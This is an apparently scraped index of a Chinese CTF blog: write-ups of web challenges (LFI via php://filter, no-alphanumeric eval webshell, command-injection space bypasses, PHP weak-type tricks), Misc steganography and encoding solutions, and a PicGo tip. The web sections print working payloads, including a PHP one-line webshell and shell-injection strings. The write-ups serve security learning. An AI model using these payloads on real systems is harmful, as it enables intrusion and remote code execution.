\u003ccenter\u003e \u003ch4\u003e Woof! Woof! \u003c/h4\u003e \u003c/center\u003e \u003cimg style=\"width:100%\" src=\"img/dog/\u003c?php echo rand(1,10)?\u003e.jpg\"\u003e\r多尝试以后发现可以读index，下面是主要的源码： php \u003c?php $file = $_GET['category']; if(isset($file)){ if( strpos( $file, \"woofers\" ) !== false || strpos( $file, \"meowers\" ) !== false || strpos( $file, \"index\")){ include ($file . '.php'); } else{ echo \"Sorry, we currently only support woofers and meowers.\"; } } ?\u003e 可以看到if判断中需要字符串包含woofers、meowers、index，那么我们只需要在filter伪协议中插入字符串绕过判断即可。 需要知道的：filter可以设定一个或多个过滤器名称，以管道符\\分隔，所以构造payload： text /index.php?category=php://filter/meowers/convert.base64-encode/resource=flag\r读出来以后解密即可获得flag 搜索的时候学到了一个其他的截断 text zip://test.zip#hello.html.php\r代表当前目录下的test.zip压缩包里面的hello.html.php，于是包含成功。 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bsidescf-2020had-a-bad-day"},{"categories":["CTF"],"content":"\r[极客大挑战 2019]RCE ME源码： text \u003c?php error_reporting(0); if(isset($_GET['code'])){ $code=$_GET['code']; if(strlen($code)\u003e40){ die(\"This is too Long.\"); } if(preg_match(\"/[A-Za-z0-9]+/\",$code)){ die(\"NO.\"); } @eval($code); } else{ highlight_file(__FILE__); } // ?\u003e\r分析一波，GET请求获得code，想要通过的话需要绕过两个检测： payload长度小于40 不能包含a-z、A-Z、0-9 和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:一些不包含数字和字母的webshell，这次摸到了相关文章：无字母数字webshell之提高篇。 使用url编码+~取反构造不可见字符串，然后加上php7版本以后支持了使用：($a)()这样的方法动态执行函数，所以我们可以构造payload：assert(eval($_POST[‘a’])) 先构造assert： text echo urlencode(~'assert'); //结果：%9E%8C%8C%9A%8D%8B\r再构造eval($_POST['a'])： text echo urlencode(~'eval($_POST[\\'a\\'])'); //结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6\r完整payload： text ?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);\r网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的~取反再获得真正的函数名。 使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是ELF是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回ret=127： 搜索了一波，原来是是disable_function搞的鬼，这个表可以在phpinfo()中查看： 因为system、exec、shell_exec等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过disable_function的方法，网上有很多其他方法，其中一个方法： 利用环境变量LD_PRELOAD来绕过 php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的 LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。 正好蚁剑的插件中就有一个名为：as_bypass_php_disable_functions的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件： 插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的/var/www/html目录是没有上传权限的，我右键以后发现能修改权限，改成0777： 在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。 上传一句话木马233.php： text \u003c?php @eval($_POST['b']);\r再用一句话木马的shell执行插件： 进入shell，目录下面多了一个名为**.antproxy.php**的文件： 再使用蚁剑连接**.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。 flag{a216900e-2427-48f7-9323-f65d0a3abdbf} ","date":"2020-12-05","objectID":"/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/:0:0","series":null,"tags":["Web","BUUCTF_Web","RCE","disable_function绕过"],"title":"极客大挑战 2019 RCE ME","uri":"/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/#极客大挑战-2019rce-me"},{"categories":["CTF"],"content":"\r[GXYCTF2019]Ping Ping Ping题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping 和DMCTF做的那道pingpingping类似，同样是使用管道符构造payload，先使用： text ?ip=127.0.0.1|ls\r目录下有两个文件：flag.php、index.php。首先试出来了空格被过滤，使用以下绕过空格： text $IFS ${IFS} $IFS$1 //$1改成$加其他数字貌似都行 \u003c \u003c\u003e {cat,flag.php} //用逗号实现了空格功能 %20 %09 在linux下反单引号里面的指令会被执行 `ls` text ?ip=|cat$IFS`ls`\r会输出该目录下所有可以打开的文件，可以查看index.php的部分源码有哪些过滤： php /?ip=|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match)){ echo preg_match(\"/\\\u0026|\\/|\\?|\\*|\\\u003c|[\\x{00}-\\x{20}]|\\\u003e|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match); die(\"fxck your symbol!\"); } else if(preg_match(\"/ /\", $ip)){ die(\"fxck your space!\"); } else if(preg_match(\"/bash/\", $ip)){ die(\"fxck your bash!\"); } else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip)){ die(\"fxck your flag!\"); } $a = shell_exec(\"ping -c 4 \".$ip); echo \" \"; print_r($a); } ?\u003e 一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问flag.php。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用readflag的ELF执行文件访问，但是还没成功。其实执行： text ?ip=|cat$IFS`ls`\r这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了我是傻逼。 最后记录下学到的姿势和这道题目的其他思路： 管道符： |直接执行后面的语句。 ||如果前面语句错误，执行后面的语句。 \u0026前面和后面命令都要执行，无论前面真假， \u0026\u0026如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令 使用以下绕过空格： text $IFS ${IFS} ${IFS}$1 $IFS$1 //$1改成$加其他数字貌似都行 \u003c \u003c\u003e {cat,flag.php} //用逗号实现了空格功能 %20 %09 //需要php环境\r覆盖源码里的$a变量（拼接变量）： text /?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php\r使用sh执行脚本： text /?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh\r内联执行： text /?ip=|cat$IFS`ls`\r附：大佬整理的博客（内含更多姿势）：命令执行漏洞利用及绕过方式总结 ","date":"2020-12-04","objectID":"/posts/ctf/gxyctf2019ping-ping-ping/:0:0","series":null,"tags":["Web","BUUCTF_Web","RCE"],"title":"GXYCTF2019 Ping Ping Ping","uri":"/posts/ctf/gxyctf2019ping-ping-ping/#gxyctf2019ping-ping-ping"},{"categories":["CTF"],"content":"\r前言这次比赛是第一次做Mics的题awa。 ","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:0:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#前言"},{"categories":["CTF"],"content":"\rMisc","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:0:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#misc"},{"categories":["CTF"],"content":"\rCheck_in真·有手就行 ","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:1:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#check_in"},{"categories":["CTF"],"content":"\rfakezip看到题目fakezip翻译：假的压缩包，所以猜应该是伪加密，贴一个原理的博客：zip伪加密，使用010 Editor打开压缩包， 找到01修改为00，再解压压缩包，虽然提示了压缩包错误但是直接无视，获得一个flag.txt 打开以后内容是：♬♩¶♯♬♭♬♫♫♪♬∮♬♭‖♭♬♭♬∮♬♭‖♭♬♭♫♫♯=，音符加密虽然是第一次听说，但是百度还是可以简单找到：文本加密为音乐符号 ","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:2:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#fakezip"},{"categories":["CTF"],"content":"\rBase family题目给出了是base家族，所以base所有种类都试一遍。base常见的种类有：base16、base32、base58、base64、base91。还有几种没听过的base种类可以在这个网站找到：CTF在线工具。 原层： text XUZbB{fp}U)=ql[n%GCbk9RZ7!XD$D)f1G{011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I}^8jjP|0\u0026whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td\"^w$Q8+8T])e.llK?*z`gS:+C]llUG:z1=ekEN}8DmJf\u0026GP\u003cRk:o_Jk\u003cJ.zp8%H0g7sYSTJ9p.\"duRBGj`g0!I+xjm(fh)]IF:\u003eomN8=m+Xp(X0:U*8Sj5|8p._o[i0:%.qu}%_=\u003cD\rbase91解码： text 3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW\rbase58解码： text JZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5\rbase32解码： text NjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q=\rbase64解码： text 666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d\rhex解码： text flag{y0u_alr3ady_kn0w_th3_Basefam1ly}\r","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:3:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#base-family"},{"categories":["CTF"],"content":"\rSlientEye根据题目直接百度SlientEye，下载以后打开图片–\u003edecode： 参数啥的都没动，密码为默认密码，直接Decode，得到一个flag.txt： html \u0026#102;\u0026#108;\u0026#97;\u0026#103;\u0026#123;\u0026#110;\u0026#49;\u0026#95;\u0026#98;\u0026#117;\u0026#95;\u0026#106;\u0026#49;\u0026#97;\u0026#110;\u0026#103;\u0026#95;\u0026#119;\u0026#117;\u0026#95;\u0026#100;\u0026#51;\u0026#125;\r再去百度搜到一篇博客：\u0026#x开头的是什么编码?，我点开一看，哦，原来是entity code实体编码，我啪的一下就把flag.txt改为flag.html，很快啊，然后是一个左正蹬、一个右鞭腿、一个左刺拳打开flag.html获得flag：flag{n1_bu_j1ang_wu_d3} ","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:4:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#slienteye"},{"categories":["CTF"],"content":"\r编码之王下载文件打开后一堆社会主义核心价值观，前面提到的：CTF在线工具就有核心价值观编码，下面放密文，上面是解码内容。 解出来以后看到第一句：如是我闻:，–\u003e与佛论禅 再解之后看第一句：新佛曰：。–\u003e新与佛论禅 解完以后直接出了一堆由：[、]、!、+、(、)组成的符号，还是百度找到了这种编码叫JSfuck，可以直接浏览器控制台console输出获得flag ","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:5:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#编码之王"},{"categories":["CTF"],"content":"\rjpgsteg题目即是用到的工具，百度下载软件，使用jphide.exe打开图片Tap code.jpg，选择seek功能解密，密码为123456（我蒙的）： 成功解密后获得一个文档，内容如下： text ... .... .. ... .. ... . . ... .. . . ..... ..... .. .... ... ... .. ..\r这里我思索了好久，刚开始以为是摩斯密码，但是又对不上号，最后找到了一个名为敲击码的，正好一行中的.分成两部分代表坐标 解码得到：ohhamazing ，加上括号就是：flag{ohhamazing} 事后多看了一眼图片命名：Tap code.jpg。这用啥解密不就在脸上写着的wosabi \\0/。。。 ","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:6:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#jpgsteg"},{"categories":["CTF"],"content":"\rCollision打开压缩包发现都是加密，但是原始大小都为4，只有CRC不一样： 所以很有可能是四位数据的CRC32碰撞，就去网上找了一个python脚本：crc32碰撞 ctf python作者原创的脚本： python import string import threading import binascii import sys def crc(_crc): l = 1 dic = string.printable _input = _crc _input = \"0X\" + _input for i in dic: for n in dic: for h in dic: for m in dic: s = i + n + h + m s = s.encode() # print(str(binascii.crc32(s)), _input) if hex(binascii.crc32(s)).upper() == _input.upper(): print(_crc, ':', s.decode()) print(l) sys.exit() #直接退出，不进行接下来的碰撞了，一般在做题的时候，碰撞不会重复 l = l + 1 def crc32(): print(\"四字节碰撞!!!\") num = int(input(\"你可能需要多个线程同时进行碰撞，请输入线程数：\")) _thread = [] _args = [] print(\"输入参数\") for i in range(num): print(i+1, end=':') _args.append(input()) # print(_args) for i in range(num): t = threading.Thread(target=crc, args=(_args[i],)) _thread.append(t) #如果在这里开始线程会出一点小bug，虽然不要紧，但是不好看，不信的话你们自己试试 # print(_thread) for i in range(num): _thread[i].start() for i in range(num): _thread[i].join() input() if __name__ == '__main__': crc32()\r使用python的多线程，因为是5个文件，开了5个线程，然后分别输入CRC码，压缩文件原来的CRC码为： text ff92876d 6c4a558b 77e8fd00 1e59a66e d1f4eb9a\r碰撞以后获得的明文： text 1on} 32co llis flag {crc\r根据flag的结构拼接一下：flag{crc32collis1on} ","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:7:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#collision"},{"categories":["CTF"],"content":"\rkaomoji题目的压缩包解压以后得到一个flag.zip压缩包和secret.txt，flag.zip中也含有secret.txt，将外面没有加密的secret.txt使用winrar压缩（需要和原来的压缩软件一致哒）以后对比flag.zip里的文件发现CRC码相同的： 配合ARCHPR使用明文攻击，获得加密密钥： [b00df998 5bdbbde6 485fa1f8] 我在进行明文攻击时虽然没有跑出来压缩包的密码，但是获得了上面的密钥，也是可以解压加密的压缩包的（具体原理不清楚）。解压明文攻击解开获得的压缩包flag_decrypted.zip，打开flag.txt是颜文字表情加密，直接复制到浏览器console控制台运行获得flag：flag{kaomoj1_1s_cut3} ","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:8:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#kaomoji"},{"categories":["CTF"],"content":"\rARCHPR题目根据提示：This file was encrypted by me with a four-digit password, try to crack it! 密码只是用了4位数字加密，可以使用ARCHPR 进行爆破，获得一个flag.png和hint.txt，hint.txt如下： hint.txt The flag is hidden by a kind of magic called LSB. Try to find it if you can find it. The key is given to you. After decryption, change it to lowercase. key: .--. .- ... ... .-- --- .-. -..\r提示中提到了使用LSB隐写，密码是一段摩斯密码，摩斯密码解密后得到密文：password，使用LSB（项目地址）脚本执行： text python lsb.py extract flag.png 1.txt password\r1.txt中就包含了解密以后的flag：flag{th1s_15_f1agggggg} ","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:9:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#archpr"},{"categories":["CTF"],"content":"\routguess​ 看题目找工具，使用outguess参考隐写工具outguess 的下载安装及使用，在kali中安装以后执行 text outguess -r flag.jpg hide.txt\r获得hide.txt文件的内容： text Qb lbh xabj NRF? Gur xrl vf f3phe1gl, tb naq penpx vg! Encrypted data: U2FsdGVkX1/nmu9u2Ho1dD9kQWv7L5a6bsUrWxBkVp68txdFL4v/givGGYy7dBU+\r上面一段使用凯撒密码移动13位获得：Do you know AES? The key is s3cur1ty, go and crack it! 其实这里和别人讨论以后才知道他们使用的是叫ROT13，相应的还搜到了ROT5、ROT13、ROT18、ROT47，百度百科看了以后就是凯撒密码的变种。所以下面一段的密文使用AES进行解密，密码是s3cur1ty，获得flag：flag{y0u_ar3_awes0m3} 解密网站：https://tool.oschina.net/encrypt ","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:10:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#outguess"},{"categories":["CTF"],"content":"\rWhitespace题目即提示，Whitespace进行一波搜索以后了解到是一种用空白符编程的语言，在压缩包里面摸了好久，在注释里发现空白编码： 这也让我想到自己在网上下工具的压缩包时，网站经常在注释里附上密码，通常都是网站的网址。 在whitespace网站中粘贴密文点上面的run： 解密获得：password is BlindWaterMark! 输入解压以后获得两张看着相同的罗翔老师.png图片和一个hint.txt： hint.txt Do you see any difference between the two pictures? Get to know its secrets and tell you quietly that you need to know a knowledge called Manchester coding. 上传文档 你看这两幅画有什么不同吗？ 了解它的秘密，悄悄地告诉你，你需要知道一门叫做曼彻斯特编码的知识。\r根据提示找出图片的不同和曼切斯特编码。图片看着相同但是经过加密，在网上搜索了一波了解到了盲水印技术，使用盲水印解密图片，项目地址：https://github.com/chishaxie/BlindWaterMark，执行： text python bwn.py decode 2.png 1.png 3.png 获得解密图片： 图片中的内容为： text 296969a5695 6696a6a9a69 5669595a566 965696666aa 69596a9666a a6a6569955a 5a66aa69a56 9566a6a6aa6\r就百度曼切斯特编码解码，找到一篇博客：一些CTF编码脚本，在里面找到了这两段： 心里一顿狂喜，因为都是2965a这个几个字符组成的，应该就是找对了。根据博客代码自行修改脚本 text import sys s = '296969a56956696a6a9a695669595a566965696666aa69596a9666aa6a6569955a5a66aa69a569566a6a6aa6' #这是前面图片里的内容 s=bin(int(s,16)) r=\"\" for i in range(len(s)/2): if s[i*2:i*2+2] == '10': r += '1' else: r += '0' print hex(int(r,2))[2:-1].decode('hex')\r执行脚本后获得flag：flag{ab1de_by_th3_law} ","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:11:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#whitespace"},{"categories":["CTF"],"content":"\rSteghide题目即工具。参考博客隐写工具Steghide，在kali中安装Steghide后执行： text steghide.exe extract -sf trump.jpg\r会提示Enter passphrase:直接回车表示空密码，获得flag.txt，打开以后里面都是由¿ ¡ .组成的密文，和Ook的另一种编码：short Ook类似也是只用? ! .组成，把叹号和问号全部替换反过来¡---\u003e! ¿---\u003e?，替换之后在线解码：https://www.splitbrain.org/services/ook，获得flag：flag{y0u_ar3_clev3r} ","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:12:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#steghide"},{"categories":["CTF"],"content":"\rSSTV题目既是工具。搜索SSTV百度百科： 慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。 了解到是一种无线电传递图片的方法，搜到的博客慢扫描电视 SSTV和B站的视频慢扫描电视SSTV，下载MMSSTV软件，把output.wav音频调制麦克风输出，我使用的方法是在声音设置里把立体声混音打开并且设为默认设备，然后电脑里播放的声音就会被录制到。等待图片绘制成功，获得flag：DMCTF{SSTV,yyds?} ","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:13:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#sstv"},{"categories":["CTF"],"content":"\rSimpleQrcode​ 下载题目是一个gif图片都是二维码，使用使用stegSovle中的Frame Browser功能，一帧一帧播放，一帧一扫，有几帧图片是少了二维码的上边，有一张是少了右边，可以参考第一张完整的图片，把上面截取拼接上去，扫码后17张图片对应的内容（根据代码行号）： text DM CT F{ Qr Co de _1 s_ so _i nt er es ti ng !! !}\r参考下题目标题和flag格式，拼接后获得flag：DMCTF{QrCode_1s_so_interesting!!!} ","date":"2020-12-01","objectID":"/posts/ctf/dmctf%E4%B9%8Bmisc/:14:0","series":null,"tags":["DMCTF2020","Misc"],"title":"DMCTF之Misc","uri":"/posts/ctf/dmctf%E4%B9%8Bmisc/#simpleqrcode"},{"categories":["瞎折腾"],"content":"2022年2月3日22:41:32 ！！！！！ 建议直接看文章末尾，我发现我就是个笨比。 ","date":"2020-11-30","objectID":"/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/:0:0","series":null,"tags":["PicGo上传","图床"],"title":"PicGo复制自定义链接","uri":"/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/#"},{"categories":["瞎折腾"],"content":"\r前言现在博客里面的图片使用的是github+jsdelivr+PicGo图床。PicGo是一个开源的上传图片的软件，支持大部分图床的上传，只需要设置对应的图床参数即可一键上传。github上PicGo的概述： PicGo: 一个用于快速上传图片并获取图片 URL 链接的工具 PicGo 本体支持如下图床： 七牛图床 v1.0 腾讯云 COS v4\\v5 版本 v1.1 \u0026 v1.5.0 又拍云 v1.2.0 GitHub v1.5.0 SM.MS V2 v2.3.0-beta.0 阿里云 OSS v1.6.0 Imgur v1.6.0 本体不再增加默认的图床支持。你可以自行开发第三方图床插件。 项目地址：PicGo 软件界面： ","date":"2020-11-30","objectID":"/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/:0:0","series":null,"tags":["PicGo上传","图床"],"title":"PicGo复制自定义链接","uri":"/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/#前言"},{"categories":["瞎折腾"],"content":"\r起因PicGo上传成功以后可以自动复制url，但是默认复制的图片链接是github提供的，github在国内又经常抽风，图片通常都是无法访问的，所以我使用了jsdelivr提供的链接访问图片，PicGo也提供了自定义链接，但是规定必须包含$url参数，也就是默认的url地址： 起初是把jsdelivr的链接直接拼在后面，每次使用的时候都再删一次。直到昨晚受不了了就尝试去修改软件试图绕过判断。 ","date":"2020-11-30","objectID":"/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/:0:0","series":null,"tags":["PicGo上传","图床"],"title":"PicGo复制自定义链接","uri":"/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/#起因"},{"categories":["瞎折腾"],"content":"\r解决方法在软件设置的配置文件里找到了customLink，和之前自己设置的链接对照了一下，认为这个就是实际的自定义链接，直接在此处修改，再上传自动复制的链接就正确了，而且绕过了必须包含$url。 ","date":"2020-11-30","objectID":"/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/:0:0","series":null,"tags":["PicGo上传","图床"],"title":"PicGo复制自定义链接","uri":"/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/#解决方法"},{"categories":["瞎折腾"],"content":"\r结语软件提供了自动使用时间戳重命名，所以我自定义链接中还是使用了$filename变量，然后博客中的图片大部分都是使用QQ的截屏功能，出来的截图后缀都是png格式，这个可以根据需要自己设定拼接，然后使用的markdown编辑器是typora，想要添加图片直接Crtl+Shift+i，把图片链接贴里面就彳亍了。白嫖真爽 2022-1-31 11:43:48 这时候发现自定义链接直接用markdown格式就更好了 other ![$fileName](https://cdn.jsdelivr.net/gh/username/repo@master/artical/$fileName.png)\r","date":"2020-11-30","objectID":"/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/:0:0","series":null,"tags":["PicGo上传","图床"],"title":"PicGo复制自定义链接","uri":"/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/#结语"},{"categories":["瞎折腾"],"content":"\r最简单修改前面的都是我在改自定义链接，至少明白了可以绕过自定义链接必须包含变量名称这个限制。 直接在自定义域名那里修改成jsDeliver对应的仓库路径，比如我的 other https://cdn.jsdelivr.net/gh/penginman/PicBed@master\r然后返回的链接就会把原来的raw.github.com/xxxxxx给替代了。 ","date":"2020-11-30","objectID":"/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/:0:0","series":null,"tags":["PicGo上传","图床"],"title":"PicGo复制自定义链接","uri":"/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/#最简单修改"},{"categories":["CTF"],"content":"\r前言比赛地址：http://dmctf.vaala.cloud:81 这次先写Web题目部分，我最后的排名： ","date":"2020-11-29","objectID":"/posts/ctf/dmctf%E4%B9%8Bweb/:0:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/ctf/dmctf%E4%B9%8Bweb/#前言"},{"categories":["CTF"],"content":"\rWeb","date":"2020-11-29","objectID":"/posts/ctf/dmctf%E4%B9%8Bweb/:0:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/ctf/dmctf%E4%B9%8Bweb/#web"},{"categories":["CTF"],"content":"\rweak_type源码： text PHP \u003c?php show_source(__FILE__); include('class.php'); //level1 if(isset($_GET['num'])){ $num = $_GET['num']; if($num===\"202020020\"){ die(\"no no no!\"); } if(intval($num,0)===202020020){ echo \"\u003cbr\u003e level 1 Ok \u003cbr\u003e\"; }else{ die('what are you doing?'); } }else{ die(); } //level 2 if(isset($_GET['v1']) \u0026\u0026 isset($_GET['v2'])){ $v1 = $_GET['v1']; $v2 = $_GET['v2']; if($v1 != $v2 \u0026\u0026 md5($v1)==md5($v2)){ echo \"\u003cbr\u003e level 2 Ok \u003cbr\u003e\"; }else{ die('Are you kidding me ?'); } }else{ die(); } //level 3 if (isset($_POST['message'])) { $message = json_decode($_POST['message']); if ($message-\u003ekey == $key) { echo \"\u003cbr\u003e Wow you got it !!! \u003cbr\u003e\"; echo file_get_contents('/flag'); } else { die(\"fail\"); } } else{ echo \"~~~~\"; }\r第一关利用intval()函数特性：直到遇上数字或正负符号才开始做转换。所以构造num=202020020a，即可。 intval函数有个特性:”直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\\0)结束转换”,在某些应用程序里由于对intval函数这个特性认识不够,错误的使用导致绕过一些安全判断导致安全漏洞 第二关利用PHP处理哈希字符串时会把”0E”开头的哈希值解释为0，所以选择两个值在md5加密后是以0E开头即可。payload：v1=QNKCDZO\u0026v2=240610708，这篇博客中还进一步的讲解了一些md5函数的漏洞。 第三关进行$message-\u003ekey和$key进行判断，$key之前没有声明过故值为空，所以传入的message也为空即可。post中传入message= 即可。 完整payload： url: http://dmctf.vaala.cloud:28113/?num=202020020a\u0026v1=QNKCDZO\u0026v2=240610708 post: message= ","date":"2020-11-29","objectID":"/posts/ctf/dmctf%E4%B9%8Bweb/:1:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/ctf/dmctf%E4%B9%8Bweb/#weak_type"},{"categories":["CTF"],"content":"\rthinkphp看到框架首先去搜索框架的漏洞，参考了[框架漏洞]Thinkphp系列漏洞【截至2020-07-20】 